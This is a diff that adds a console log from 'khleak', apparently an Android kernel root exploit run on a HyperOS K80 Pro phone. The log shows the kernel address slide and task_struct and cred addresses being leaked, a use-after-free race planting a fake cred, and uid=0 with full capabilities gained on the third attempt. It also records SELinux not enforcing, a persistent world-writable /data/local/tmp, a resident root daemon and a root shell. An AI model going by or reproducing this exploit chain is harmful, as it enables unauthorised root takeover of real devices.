@@ -1,0 +1,131 @@
+[khleak BUILD=2026-11-16-hazardfix v25]
+[profile] HyperOS 4.0.3.0 (miro, K80 Pro)
+[profile] uname  6.6.118-android15-8-gf72a02f47f4b-abogki551678766-4k
+[profile] page=4096  do_timer_create+0xa8  selinux_state=0xffffffc08237a350
+parent pinned to cpu0
+=== khleak root（一条命令）===
+creator=exec(exec线程自己建) clock=THREAD
+UID=2000  E=2000
+[kprobe] 删旧探针 khl/slide 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[slide] ip=0xffffffde12ecda70
+[slide] slide=0x1d92e00000  2MiB-align=OK  64KiB-align=OK
+[kprobe] 删旧探针 khl/task 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[task] slab offset = 0x14c0 = 5312 (% 5312 = 0) OK
+[task] task_struct = 0xffffff89fa2094c0 (pid=9169 comm="khl-task-a" 已校验)
+[task] +cred = 0xffffff89fa209ce0  +real_cred = 0xffffff89fa209cd8  +comm = 0xffffff89fa209cf0
+[selinux] 当前 enforce=0
+[load] 本 boot 累计对内核施压 7 秒 / 上限 150 秒
+=== plant (stage D) ===
+slide=0x1d92e00000 task=0xffffff89fa2094c0
+target=cred attempts=6 carrier_len=8192
+uid=2000
+[selinux] enforce=0
+[orphan] 无残留，环境干净
+--- rss_stat/trigger ---
+  enable_event:kd:ei:unlimited
+  enable_event:kd:pe:unlimited
+  enable_event:kd:del:unlimited
+  共 3 项
+
+=== fake-cred 提权（目标：uid=0 + FULLCAP）===
+[perm] /data/local/tmp → 0777 OK（fsuid 回滚到 2000）
+[perm] ⚠ 这是【持久】修改（data 分区），重启不恢复
+[perm]   用完请执行：khleak restore
+[kprobe] 删旧探针 khl/htask 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[holder] task_struct = 0xffffff89eea3d300（tpid=9170 comm="khl-task-b" 已校验）
+[holder] pid=9170 task 候选=1
+[holder] pid=9170 g_task=0xffffff89eea3d300 (+cred=0xffffff89eea3db20)
+--- fake-cred attempt 1/6 ---
+[uaf] captured=2048 chosen=0xffffff89dc440108 raw=258048
+[kprobe] 删旧探针 kd/del 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[kprobe] 删旧探针 kd/pe 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[kprobe] 删旧探针 kd/ei 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[cred] node=0xffffff89dc440180 cred=0xffffff89dc440198 task+cred=0xffffff89eea3db20 off=0x180 caps=0x1ffffffffff
+[stream] pairs=4 base=0xa5c440 off=0x180 len=8192 cpus=8
+[khleak BUILD=2026-11-16-hazardfix v25]
+[killer] tgid=9171 old=9176 补发 8193 次
+[stream] page_freed=1 free_cpu=0
+[stream] free 行:          rcuop/0-18      [000] b....   226.075816: mm_page_free: page=0000000064521233 pfn=0xa5c440 order=1
+[stream] HIT pfn=0xa5c440
+[stream] 命中行:       khl-task-b-9169    [000] .....   226.150879: mm_page_alloc: page=0000000064521233 pfn=0xa5c440 order=1 migratetype=0 gfp_flags=GFP_NOWAIT|__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_COMP|__GFP_HARDWALL
+[stream] writes=80 hit=1
+[uaf] child=9171 code=1 status=0
+[uaf] del=2048  del(head!=0)=0  pe=4  ei=3
+[uaf] => 窗口未开。未开 rs 探针，无法区分原因；排查时加 --diag
+[holder] reap 完成，唤醒 holder
+[holder] 收到 wake，开始取 id
+[holder] getuid=2000
+[holder] 当前 id：uid=2000 euid=2000 gid=2000 egid=2000
+[holder] 回复: uid=2000 euid=2000 gid=2000 egid=2000 real=0 exit=0
+
+[cycle] ms=2596 result=ok
+[uaf] 不是 SIGKILL（status=0），本轮不算命中
+[cred] 本轮未命中（窗口/页）
+--- fake-cred attempt 2/6 ---
+[uaf] captured=2048 chosen=0xffffff89c2eed290 raw=258048
+[kprobe] 删旧探针 kd/del 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[kprobe] 删旧探针 kd/pe 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[kprobe] 删旧探针 kd/ei 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[cred] node=0xffffff89c2eed308 cred=0xffffff89c2eed320 task+cred=0xffffff89eea3db20 off=0x1308 caps=0x1ffffffffff
+[stream] pairs=4 base=0xa42eec off=0x1308 len=8192 cpus=8
+[killer] tgid=9177 old=9182 补发 8193 次
+[stream] page_freed=1 free_cpu=3
+[stream] free 行:          rcuop/0-18      [003] b....   229.515814: mm_page_free: page=000000003b5e8e4e pfn=0xa42eec order=1
+[stream] HIT pfn=0xa42eec
+[stream] 命中行:       khl-task-b-9169    [003] .....   229.677601: mm_page_alloc: page=000000003b5e8e4e pfn=0xa42eec order=1 migratetype=0 gfp_flags=GFP_NOWAIT|__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_COMP|__GFP_HARDWALL
+[stream] writes=80 hit=1
+[uaf] child=9177 code=2 status=9
+[uaf] del=2048  del(head!=0)=0  pe=4  ei=3
+[uaf] => 窗口未开。未开 rs 探针，无法区分原因；排查时加 --diag
+[holder] reap 完成，唤醒 holder
+[holder] 收到 wake，开始取 id
+[holder] getuid=2000
+[holder] 当前 id：uid=2000 euid=2000 gid=2000 egid=2000
+[holder] 回复: uid=2000 euid=2000 gid=2000 egid=2000 real=0 exit=0
+
+[cycle] ms=2533 result=ok
+[cred] 假 cred 未生效，重试
+[cred] 本轮窗口没开（del(head!=0)=0），一个字节都没写，安全重试
+--- fake-cred attempt 3/6 ---
+[uaf] captured=2048 chosen=0xffffff802fb74d68 raw=258048
+[kprobe] 删旧探针 kd/del 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[kprobe] 删旧探针 kd/pe 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[kprobe] 删旧探针 kd/ei 失败 rc=-16（Device or resource busy）—— 事件仍 enabled，下面会核对 spec
+[cred] node=0xffffff802fb74de0 cred=0xffffff802fb74df8 task+cred=0xffffff89eea3db20 off=0xde0 caps=0x1ffffffffff
+[stream] pairs=4 base=0xafb74 off=0xde0 len=8192 cpus=8
+[killer] tgid=9183 old=9188 补发 8193 次
+[stream] page_freed=1 free_cpu=0
+[stream] free 行:          rcuop/0-18      [000] b....   233.095717: mm_page_free: page=000000008fad8cfb pfn=0xafb74 order=1
+[stream] HIT pfn=0xafb74
+[stream] 命中行:       khl-task-b-9169    [000] .....   233.173901: mm_page_alloc: page=000000008fad8cfb pfn=0xafb74 order=1 migratetype=0 gfp_flags=GFP_NOWAIT|__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_COMP|__GFP_HARDWALL|
+[stream] writes=80 hit=1
+[uaf] child=9183 code=2 status=9
+[uaf] del=2048  del(head!=0)=1  pe=3  ei=2
+[uaf] => 窗口【已打开】：节点在 release_task 时仍在树上
+[holder] reap 完成，唤醒 holder
+[holder] 收到 wake，开始取 id
+[holder] getuid=0
+[holder] 当前 id：uid=0 euid=0 gid=0 egid=0
+[holder] fork 孙子=0
+[renew] 孙子开始续期
+[renew] REAL_CRED_ACTIVE uid=0 gid=0 cap=0x1ffffffffff
+[holder] fork 孙子=9189
+[holder] 回复: real=1 exit=1
+
+[holder] rootd up; 已交持页权，exiting
+[holder] 已退出 status=0
+[khleak BUILD=2026-11-16-hazardfix v25]
+[cycle] ms=2530 result=ok
+
+[cred] 统计：共 3 轮｜窗口没开 1｜页未命中 1｜窗口开未写中 0｜页已抢到 1
+[cred] 窗口开启率 33.3%（1/3）
+
+==================== 提权成功 ====================
+rootd 已在 uid=0 + FULLCAP 下常驻
+==============================================
+[cred] 完成。rootd 是唯一的高权进程
+[cred] 清理：su -c "khleak clean"
+
+[cred] 进入 root shell（khleak su）…
+[khleak BUILD=2026-11-16-hazardfix v25]
+EXIT rc=0
